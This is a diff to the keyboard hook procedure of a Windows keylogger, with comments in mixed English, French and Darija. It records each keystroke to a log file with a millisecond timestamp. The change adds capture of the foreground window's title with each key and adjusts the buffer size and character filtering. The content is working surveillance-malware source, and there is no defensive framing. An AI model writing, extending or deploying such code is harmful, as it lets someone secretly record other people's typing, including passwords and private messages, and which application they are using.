@@ -16,19 +16,24 @@ LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam)
         BYTE buff[256];  // array of 256 case of type byte qui contenir tout les caracter de clavier 
         PBYTE lpKeyState = buff;     // pointer for array buffer 
         GetKeyboardState(lpKeyState); // now this funcition fill the table of buffer with keyboard state via pointer 
-        WCHAR pwszBuff[2];  // buffer type wchar contain the current key the output of to unicode fucntion 
+        WCHAR pwszBuff[4];  // buffer type wchar contain the current key the output of to unicode fucntion 
         SYSTEMTIME time;
         LPSYSTEMTIME lpSystemTime = &time;
-        GetLocalTime(lpSystemTime);     
-        int result = ToUnicode(keyCode, scanCode, lpKeyState, pwszBuff ,2 ,0); // to transfer key code to key name 
+        GetLocalTime(lpSystemTime);    
+
+       HWND window = GetForegroundWindow();
+       char title[256];
+       int length = GetWindowTextA(window, title, sizeof(title));
         
+        int result = ToUnicode(keyCode, scanCode, lpKeyState, pwszBuff ,2 ,0); // to transfer key code to key name   
         fprintf(g_log, " %02u:%02u:%02u.%03u ",
            lpSystemTime->wHour,
            lpSystemTime->wMinute,
            lpSystemTime->wSecond,
            lpSystemTime->wMilliseconds);
+        fprintf(g_log, " on %s ", title);
                     
-           if (result == 1 && pwszBuff[0] >= 32){
+           if (result == 1 && pwszBuff[0] > 32){
                 fprintf(g_log, "Key pressed: %c\n", pwszBuff[0]);     // ykteb code tae character f log.txt
                  
            }
